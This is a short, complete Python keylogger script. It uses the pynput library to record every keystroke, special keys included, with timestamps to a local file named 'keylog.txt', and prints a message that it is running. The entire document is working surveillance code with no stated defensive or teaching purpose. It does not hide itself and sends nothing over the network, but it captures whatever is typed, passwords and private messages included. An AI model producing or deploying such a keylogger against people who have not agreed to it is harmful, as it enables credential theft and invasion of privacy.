from pynput.keyboard import Listener
import logging

# Set the filename for logging
log_file = "keylog.txt"

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key Pressed: {key.char}")
    except AttributeError:
        # Special keys (e.g., space, shift, enter)
        logging.info(f"Special Key: {key}")

# Start the keylogger
with Listener(on_press=on_press) as listener:
    print(f"Keylogger running... Logging to {log_file}")
    listener.join()
